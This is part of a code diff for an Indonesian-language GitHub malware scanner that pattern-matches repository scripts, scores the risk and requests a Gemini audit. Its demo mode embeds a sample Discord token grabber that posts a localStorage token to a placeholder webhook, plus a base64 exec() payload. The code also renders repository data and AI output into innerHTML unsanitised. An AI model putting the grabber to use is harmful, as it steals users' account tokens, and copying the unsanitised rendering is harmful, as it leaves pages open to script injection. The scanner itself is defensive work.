+                       path.endsWith('.ps1') || path.endsWith('.sh') || path.endsWith('.vbs') || path.endsWith('.php');
+            }).slice(0, 12); // Limit to top 12 script files to avoid rate-limiting
+
+            for (const scriptFile of scriptFiles) {
+                try {
+                    const rawUrl = `https://raw.githubusercontent.com/${repoMeta.owner}/${repoMeta.repo}/${repoData.default_branch}/${scriptFile.path}`;
+                    const rawRes = await fetch(rawUrl);
+                    if (rawRes.ok) {
+                        const content = await rawRes.text();
+                        // Scan content against pattern engine
+                        for (const pattern of SUSPICIOUS_PATTERNS) {
+                            if (pattern.regex.test(content)) {
+                                // Extract line context
+                                const lines = content.split('\n');
+                                const matchIndex = lines.findIndex(l => pattern.regex.test(l));
+                                const snippet = lines.slice(Math.max(0, matchIndex - 2), Math.min(lines.length, matchIndex + 3)).join('\n');
+
+                                threats.push({
+                                    type: 'CODE_PATTERN',
+                                    severity: pattern.severity,
+                                    file: scriptFile.path,
+                                    title: pattern.name,
+                                    desc: pattern.description,
+                                    codeSnippet: snippet,
+                                    rawContent: content
+                                });
+                            }
+                        }
+                    }
+                } catch (e) {
+                    // Ignore individual fetch error
+                }
+            }
+
+            // Repository Age & Suspicious Metadata Heuristics
+            const createdDate = new Date(repoData.created_at);
+            const daysOld = Math.floor((new Date() - createdDate) / (1000 * 60 * 60 * 24));
+            
+            if (daysOld < 14 && repoData.stargazers_count < 2 && dangerousBinaries.length > 0) {
+                threats.push({
+                    type: 'HEURISTIC',
+                    severity: 'HIGH',
+                    file: 'REPOSITORI',
+                    title: 'Repository Baru dengan File Eksekutabel & Reputasi Rendah',
+                    desc: `Repo baru dibuat (${daysOld} hari lalu) dengan star rendah dan berisi file executable. Sering digunakan pada skenario penyebaran malware kilat.`,
+                    codeSnippet: `Dibuat pada: ${repoData.created_at} | Stars: ${repoData.stargazers_count}`
+                });
+            }
+
+            return {
+                totalScannedFiles: scannedFilesCount,
+                dangerousBinaries,
+                threats
+            };
+        }
+
+        // Simulated Grabber Scan for Demo Purposes
+        function runSimulatedGrabberScan() {
+            const progressSec = document.getElementById('scanningProgressSection');
+            const resultsSec = document.getElementById('resultsDashboard');
+            progressSec.classList.remove('hidden');
+            resultsSec.classList.add('hidden');
+            document.getElementById('scanConsole').innerHTML = '';
+
+            updateProgress(20, 'Memulai simulasi analisis skrip Token Grabber...');
+            updateProgress(50, 'Mendownload index.js dan builder.py...');
+            updateProgress(80, 'Mendeteksi string Base64 dan webhook Discord aktif...');
+            updateProgress(100, 'Simulasi Selesai!', 'success');
+
+            const mockRepoData = {
+                name: 'discord-token-grabber-poc',
+                full_name: 'demo-security-poc/discord-token-grabber-poc',
+                stargazers_count: 0,
+                forks_count: 0,
+                created_at: new Date().toISOString(),
+                owner: { login: 'demo-security-poc', avatar_url: 'https://github.com/github.png' },
+                description: 'Contoh skrip pembuktian konsep (PoC) pencuri token discord.',
+                html_url: 'https://github.com/demo-security-poc/discord-token-grabber-poc'
+            };
+
+            const mockFindings = {
+                totalScannedFiles: 8,
+                dangerousBinaries: [{ path: 'dist/payload.exe', size: 2450000, ext: '.exe' }],
+                threats: [
+                    {
+                        type: 'CODE_PATTERN',
+                        severity: 'CRITICAL',
+                        file: 'src/grabber.js',
+                        title: 'Discord / Webhook Token Grabber',
+                        desc: 'Upaya mengekstraksi token otentikasi pengguna Discord dari LocalStorage dan mengirimkannya ke Discord Webhook.',
+                        codeSnippet: `const webhook = "https://discord.com/api/webhooks/10928374928/XyZ90a8B_SecretURL";\nfunction grabToken() {\n   let token = window.localStorage.getItem("token");\n   fetch(webhook, { method: "POST", body: JSON.stringify({ content: token }) });\n}`,
+                        rawContent: `// Discord Token Grabber PoC Code\nconst webhook = "https://discord.com/api/webhooks/10928374928/XyZ90a8B_SecretURL";\nfunction grabToken() {\n   let token = window.localStorage.getItem("token");\n   fetch(webhook, { method: "POST", body: JSON.stringify({ content: token }) });\n}`
+                    },
+                    {
+                        type: 'CODE_PATTERN',
+                        severity: 'HIGH',
+                        file: 'builder.py',
+                        title: 'Kode Ter-obfuscate / Encoded Payload Execution',
+                        desc: 'Skrip Python mengeksekusi payload terenkripsi Base64 secara langsung menggunakan exec().',
+                        codeSnippet: `import base64\nexec(base64.b64decode('aW1wb3J0IG9zLHN5c3RlbQpvcy5zeXN0ZW0oImNhbGMuZXhlIik='))`,
+                        rawContent: `import base64\nexec(base64.b64decode('aW1wb3J0IG9zLHN5c3RlbQpvcy5zeXN0ZW0oImNhbGMuZXhlIik='))`
+                    },
+                    {
+                        type: 'BINARY_FILE',
+                        severity: 'HIGH',
+                        file: 'dist/payload.exe',
+                        title: 'File Eksekutabel Terdeteksi (.exe)',
+                        desc: 'Binary payload.exe ditemukan dalam direktori distribusi.',
+                        codeSnippet: '[File Binary Executable Win32]'
+                    }
+                ]
+            };
+
+            setTimeout(() => {
+                progressSec.classList.add('hidden');
+                resultsSec.classList.remove('hidden');
+                renderScanResults(mockRepoData, mockFindings);
+            }, 600);
+        }
+
+        // Calculate Risk Score (0 - 100)
+        function calculateRiskScore(threats) {
+            if (!threats || threats.length === 0) return 0;
+            let totalWeight = 0;
+
+            for (const t of threats) {
+                if (t.severity === 'CRITICAL') totalWeight += 45;
+                else if (t.severity === 'HIGH') totalWeight += 25;
+                else if (t.severity === 'MEDIUM') totalWeight += 10;
+                else totalWeight += 5;
+            }
+
+            return Math.min(100, totalWeight);
+        }
+
+        // Render All UI Results
+        function renderScanResults(repoData, findings) {
+            currentScanResult = { repoData, findings };
+
+            const riskScore = calculateRiskScore(findings.threats);
+            
+            // Update Metric Counters
+            document.getElementById('metricTotalFiles').innerText = findings.totalScannedFiles;
+            document.getElementById('metricThreatsFound').innerText = findings.threats.length;
+            document.getElementById('metricBinariesFound').innerText = findings.dangerousBinaries.length;
+            document.getElementById('metricRepoStars').innerText = repoData.stargazers_count;
+            document.getElementById('threatsBadgeCount').innerText = findings.threats.length;
+
+            // Verdict Styling
+            const verdictCard = document.getElementById('verdictCard');
+            const verdictIconContainer = document.getElementById('verdictIconContainer');
+            const verdictIcon = document.getElementById('verdictIcon');
+            const verdictTitle = document.getElementById('verdictTitle');
+            const verdictBadge = document.getElementById('verdictBadge');
+            const verdictDesc = document.getElementById('verdictDesc');
+
+            if (riskScore >= 60) {
+                verdictCard.className = "glass-panel p-6 sm:p-8 rounded-2xl border-rose-500/50 glow-red";
+                verdictIconContainer.className = "p-4 rounded-2xl shrink-0 bg-rose-500/20 text-rose-400 border border-rose-500/30";
+                verdictIcon.setAttribute('data-lucide', 'shield-alert');
+                verdictTitle.innerText = "BERBAHAYA / MALICIOUS";
+                verdictTitle.className = "text-2xl font-bold text-rose-400";
+                verdictBadge.innerText = "RISIKO TINGGI";
+                verdictBadge.className = "px-3 py-1 rounded-full text-xs font-bold uppercase bg-rose-500/20 text-rose-300 border border-rose-500/40";
+                verdictDesc.innerText = "Repositori ini mengandung indikator skrip berbahaya, token grabber, atau malware yang berpotensi membahayakan perangkat Anda!";
+            } else if (riskScore > 0) {
+                verdictCard.className = "glass-panel p-6 sm:p-8 rounded-2xl border-amber-500/50 glow-yellow";
+                verdictIconContainer.className = "p-4 rounded-2xl shrink-0 bg-amber-500/20 text-amber-400 border border-amber-500/30";
+                verdictIcon.setAttribute('data-lucide', 'alert-triangle');
+                verdictTitle.innerText = "PERLU WASPADA";
+                verdictTitle.className = "text-2xl font-bold text-amber-400";
+                verdictBadge.innerText = "RISIKO SEDANG";
+                verdictBadge.className = "px-3 py-1 rounded-full text-xs font-bold uppercase bg-amber-500/20 text-amber-300 border border-amber-500/40";
+                verdictDesc.innerText = "Ditemukan beberapa indikator skrip ter-obfuscate atau file eksekutabel. Lakukan verifikasi sebelum menjalankan kode.";
+            } else {
+                verdictCard.className = "glass-panel p-6 sm:p-8 rounded-2xl border-emerald-500/50 glow-green";
+                verdictIconContainer.className = "p-4 rounded-2xl shrink-0 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30";
+                verdictIcon.setAttribute('data-lucide', 'shield-check');
+                verdictTitle.innerText = "AMAN (TIDAK ADA THREAT DITEMUKAN)";
+                verdictTitle.className = "text-2xl font-bold text-emerald-400";
+                verdictBadge.innerText = "BERSIH";
+                verdictBadge.className = "px-3 py-1 rounded-full text-xs font-bold uppercase bg-emerald-500/20 text-emerald-300 border border-emerald-500/40";
+                verdictDesc.innerText = "Tidak ada pola malware, trojan, atau skrip berbahaya yang terdeteksi dalam repositori ini.";
+            }
+
+            // Metadata Subtitle
+            document.getElementById('repoMetaSubtitle').innerHTML = `
+                <span><strong class="text-slate-200">Repo:</strong> ${repoData.full_name}</span>
+                <span><strong class="text-slate-200">Owner:</strong> ${repoData.owner?.login || 'N/A'}</span>
+                <span><strong class="text-slate-200">Lisensi:</strong> ${repoData.license ? repoData.license.spdx_id : 'Tidak ada lisensi'}</span>
+            `;
+
+            // Update Gauge Chart
+            updateRiskGauge(riskScore);
+
+            // Populate Threats List (Tab 1)
+            renderThreatsTab(findings.threats);
+
+            // Populate Repo Intelligence (Tab 3)
+            renderRepoIntelTab(repoData, findings);
+
+            // Trigger AI Audit
+            generateAiAudit();
+
+            lucide.createIcons();
+        }
+
+        // Initialize and Update Doughnut Risk Gauge
+        function initRiskGaugeChart(score) {
+            const ctx = document.getElementById('riskGaugeChart').getContext('2d');
+            riskChartInstance = new Chart(ctx, {
+                type: 'doughnut',
+                data: {
+                    datasets: [{
+                        data: [score, 100 - score],
+                        backgroundColor: [
+                            score > 50 ? '#ef4444' : (score > 0 ? '#f59e0b' : '#22c55e'),
+                            '#1e293b'
+                        ],
+                        borderWidth: 0
+                    }]
+                },
+                options: {
+                    cutout: '80%',
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: { tooltip: { enabled: false } }
+                }
+            });
+        }
+
+        function updateRiskGauge(score) {
+            document.getElementById('riskScoreText').innerText = `${score}%`;
+            document.getElementById('riskScoreLabel').innerText = score > 50 ? 'BAHAYA' : (score > 0 ? 'WASPADA' : 'AMAN');
+            
+            if (riskChartInstance) {
+                riskChartInstance.data.datasets[0].data = [score, 100 - score];
+                riskChartInstance.data.datasets[0].backgroundColor[0] = score > 50 ? '#ef4444' : (score > 0 ? '#f59e0b' : '#22c55e');
+                riskChartInstance.update();
+            }
+        }
+
+        // Render Threats List
+        function renderThreatsTab(threats) {
+            const container = document.getElementById('threatsList');
+            if (!threats || threats.length === 0) {
+                container.innerHTML = `
+                    <div class="text-center py-10 bg-slate-900/40 rounded-xl border border-slate-800 space-y-2">
+                        <i data-lucide="check-circle-2" class="w-10 h-10 text-emerald-400 mx-auto"></i>
+                        <h4 class="text-sm font-semibold text-white">Tidak Ada Ancaman Kritis Ditemukan</h4>
+                        <p class="text-xs text-slate-400 max-w-md mx-auto">Skrip dan struktur file dalam pemindaian ini bersih dari signature malware bawaan.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            container.innerHTML = threats.map((t, index) => {
+                let badgeColor = "bg-rose-500/20 text-rose-300 border-rose-500/30";
+                if (t.severity === 'HIGH') badgeColor = "bg-amber-500/20 text-amber-300 border-amber-500/30";
+                if (t.severity === 'MEDIUM') badgeColor = "bg-yellow-500/20 text-yellow-300 border-yellow-500/30";
+
+                return `
+                    <div class="p-4 bg-slate-900/80 rounded-xl border border-slate-800 hover:border-slate-700 transition space-y-3">
+                        <div class="flex items-start justify-between gap-4">
+                            <div class="space-y-1">
+                                <div class="flex items-center space-x-2">
+                                    <span class="px-2 py-0.5 text-[10px] font-bold rounded-md border uppercase ${badgeColor}">${t.severity}</span>
+                                    <h4 class="text-sm font-bold text-white">${t.title}</h4>
+                                </div>
+                                <p class="text-xs text-slate-300">${t.desc}</p>
+                                <div class="text-[11px] font-mono text-cyan-400 pt-1">
+                                    📁 Path File: <span class="bg-slate-950 px-2 py-0.5 rounded border border-slate-800">${t.file}</span>
+                                </div>
+                            </div>
+                            ${t.codeSnippet ? `
+                                <button onclick="viewCodeInInspector('${encodeURIComponent(t.file)}', '${encodeURIComponent(t.codeSnippet)}', '${encodeURIComponent(t.title)}')" 
+                                    class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-cyan-400 hover:text-cyan-300 border border-slate-700 rounded-lg text-xs font-semibold shrink-0 transition flex items-center gap-1">
+                                    <i data-lucide="eye" class="w-3.5 h-3.5"></i>
+                                    <span>Lihat Kode</span>
+                                </button>
+                            ` : ''}
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // View Code Snippet in Inspector Tab
+        function viewCodeInInspector(encFile, encSnippet, encTitle) {
+            const file = decodeURIComponent(encFile);
+            const snippet = decodeURIComponent(encSnippet);
+            const title = decodeURIComponent(encTitle);
+
+            activeSelectedFile = { file, snippet, title };
+
+            document.getElementById('activeCodeFileName').innerText = `📄 ${file}`;
+            document.getElementById('activeCodeMatchInfo').innerText = `Terdeteksi Pola: ${title}`;
+            document.getElementById('codeSnippetViewer').innerText = snippet;
+
+            switchTab('codeTab');
+            showToast(`Memuat skrip dari ${file}`, 'info');
+        }
+
+        // Render Repository Intelligence Data
+        function renderRepoIntelTab(repoData, findings) {
+            const metaList = document.getElementById('repoMetaList');
+            const created = new Date(repoData.created_at).toLocaleDateString('id-ID', { year: 'numeric', month: 'long', day: 'numeric' });
+            const updated = new Date(repoData.pushed_at || repoData.updated_at).toLocaleDateString('id-ID', { year: 'numeric', month: 'long', day: 'numeric' });
+
+            metaList.innerHTML = `
+                <li class="py-2 flex justify-between"><span>Nama Repo</span><strong class="text-white font-mono">${repoData.name}</strong></li>
+                <li class="py-2 flex justify-between"><span>Pemilik / Org</span><strong class="text-cyan-400">${repoData.owner?.login}</strong></li>
+                <li class="py-2 flex justify-between"><span>Tanggal Dibuat</span><strong class="text-slate-200">${created}</strong></li>
+                <li class="py-2 flex justify-between"><span>Pembaruan Terakhir</span><strong class="text-slate-200">${updated}</strong></li>
+                <li class="py-2 flex justify-between"><span>Jumlah Star</span><strong class="text-yellow-400">⭐ ${repoData.stargazers_count}</strong></li>
+                <li class="py-2 flex justify-between"><span>Forks</span><strong class="text-slate-200">🍴 ${repoData.forks_count}</strong></li>
+                <li class="py-2 flex justify-between"><span>Isu Terbuka (Open Issues)</span><strong class="text-slate-200">${repoData.open_issues_count}</strong></li>
+            `;
+
+            const releasesContainer = document.getElementById('repoReleasesList');
+            if (findings.dangerousBinaries.length > 0) {
+                releasesContainer.innerHTML = findings.dangerousBinaries.map(b => `
+                    <div class="p-2.5 bg-slate-950 rounded-lg border border-rose-500/30 flex items-center justify-between">
+                        <span class="font-mono text-rose-300 text-xs">${b.path}</span>
+                        <span class="text-[10px] px-2 py-0.5 bg-rose-500/20 text-rose-400 rounded">${b.ext}</span>
+                    </div>
+                `).join('');
+            } else {
+                releasesContainer.innerHTML = `
+                    <div class="p-3 bg-slate-950 rounded-lg text-emerald-400 flex items-center gap-2">
+                        <i data-lucide="check" class="w-4 h-4"></i>
+                        <span>Tidak ada file biner eksekutabel (.exe/.dll) ditemukan dalam tree.</span>
+                    </div>
+                `;
+            }
+        }
+
+        // Switch Active Tabs
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            document.querySelectorAll('.tab-btn').forEach(el => {
+                el.classList.remove('border-cyan-500', 'text-cyan-400');
+                el.classList.add('border-transparent', 'text-slate-400');
+            });
+
+            document.getElementById(tabId).classList.remove('hidden');
+            const activeBtn = document.getElementById(`tabBtn-${tabId}`);
+            if (activeBtn) {
+                activeBtn.classList.remove('border-transparent', 'text-slate-400');
+                activeBtn.classList.add('border-cyan-500', 'text-cyan-400');
+            }
+        }
+
+        // Generate AI Security Audit via Gemini API (gemini-3-flash-preview)
+        async function generateAiAudit() {
+            if (!currentScanResult) return;
+
+            const aiContainer = document.getElementById('aiReportContent');
+            aiContainer.innerHTML = `
+                <div class="flex items-center space-x-3 py-6">
+                    <div class="w-4 h-4 rounded-full bg-purple-400 animate-ping"></div>
+                    <span class="text-purple-300 text-xs font-mono">Gemini AI sedang menganalisis pola ancaman dan konteks kode...</span>
+                </div>
+            `;
+
+            const { repoData, findings } = currentScanResult;
+            const customKey = localStorage.getItem('gitshield_gemini_key') || '';
+            const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent?key=${customKey}`;
+
+            const systemPrompt = "Anda adalah pakar Cyber Security dan Reverse Engineer Malware senior. Tugas Anda adalah menganalisis repositori GitHub berdasarkan ringkasan temuan keamanan untuk menentukan apakah repositori mengandung virus, token grabber, backdoor, atau file berbahaya secara objektif. Berikan penjelasan ringkas, lugas, mudah dipahami pengembang, dan sertakan rekomendasi keamanan dalam Bahasa Indonesia.";
+
+            const userPrompt = `
+Lakukan Audit Keamanan terhadap Repositori GitHub berikut:
+- Repository Name: ${repoData.full_name}
+- Stars: ${repoData.stargazers_count} | Forks: ${repoData.forks_count}
+- Dibuat Pada: ${repoData.created_at}
+- Deskripsi: ${repoData.description || 'Tidak ada deskripsi'}
+- Total File Di-scan: ${findings.totalScannedFiles}
+- Jumlah File Executable (.exe/dll): ${findings.dangerousBinaries.length}
+
+Temuan Pola Ancaman Kode:
+${JSON.stringify(findings.threats, null, 2)}
+
+Mohon buatkan laporan singkat dengan format Markdown:
+1. **Ringkasan Eksekutif Keamanan & Vonis AI** (Aman / Waspada / Bahaya).
+2. **Analisis Bahaya Utama** (Jelaskan mengapa skrip/file yang ditemukan berbahaya atau apakah ada kemungkinan False Positive).
+3. **Rekomendasi Tindakan Bagi Pengguna** (Apakah aman di-clone/run atau harus dihindari).
+            `;
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: userPrompt }] }],
+                        systemInstruction: { parts: [{ text: systemPrompt }] }
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Status API Gemini: ${response.status}`);
+                }
+
+                const result = await response.json();
+                const aiText = result.candidates?.[0]?.content?.parts?.[0]?.text;
+
+                if (aiText) {
+                    aiContainer.innerHTML = marked.parse(aiText);
+                } else {
+                    aiContainer.innerText = "Tidak mendapatkan respons teks yang valid dari Gemini AI.";
+                }
+
+            } catch (err) {
+                aiContainer.innerHTML = `
+                    <div class="p-4 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 space-y-2">
+                        <div class="font-bold">Gagal Mengumpulkan Laporan AI</div>
+                        <div>${err.message}</div>
+                        <p class="text-slate-400">Anda tetap dapat melihat temuan statis pada tab "Ancaman & File Berbahaya".</p>
+                    </div>
+                `;
+            }
+        }
+
+        // Run AI Audit specifically for the selected active file in Inspector
+        async function runAIAuditForActiveFile() {
+            if (!activeSelectedFile) {
+                showToast('Pilih file terlebih dahulu dari tab Ancaman!', 'error');
+                return;
+            }
+
+            switchTab('aiReportTab');
+            const aiContainer = document.getElementById('aiReportContent');
+            aiContainer.innerHTML = `
+                <div class="flex items-center space-x-3 py-6">
+                    <div class="w-4 h-4 rounded-full bg-purple-400 animate-ping"></div>
+                    <span class="text-purple-300 text-xs font-mono">Gemini AI menganalisis potongan kode khusus file: ${activeSelectedFile.file}...</span>
+                </div>
+            `;
+
+            const customKey = localStorage.getItem('gitshield_gemini_key') || '';
+            const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent?key=${customKey}`;
+
+            const systemPrompt = "Anda adalah Pakar Keamanan Kode. Jelaskan Potensi Bahaya dari Potongan Kode berikut ini secara spesifik, serta indikasi False Positive jika ada dalam Bahasa Indonesia.";
+            const userPrompt = `
+Silakan analisis file berikut:
+- File Path: ${activeSelectedFile.file}
+- Pola Terdeteksi: ${activeSelectedFile.title}
+- Potongan Kode:
+\`\`\`
+${activeSelectedFile.snippet}
+\`\`\`
+
+Berikan penjelasan:
+1. Apa fungsi dari potongan kode ini?
+2. Mengapa skrip ini teridentifikasi berbahaya?
+3. Apakah ini pasti malware atau bisa jadi skrip utilitas biasa (False Positive)?
+            `;
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: userPrompt }] }],
+                        systemInstruction: { parts: [{ text: systemPrompt }] }
+                    })
+                });
+
+                const result = await response.json();
+                const aiText = result.candidates?.[0]?.content?.parts?.[0]?.text;
+
+                if (aiText) {
+                    aiContainer.innerHTML = marked.parse(aiText);
+                } else {
+                    aiContainer.innerText = "Gagal mengambil respons AI untuk file ini.";
+                }
+            } catch (err) {
+                showToast(err.message, 'error');
+            }
+        }
+    </script>
+</body>
+</html>
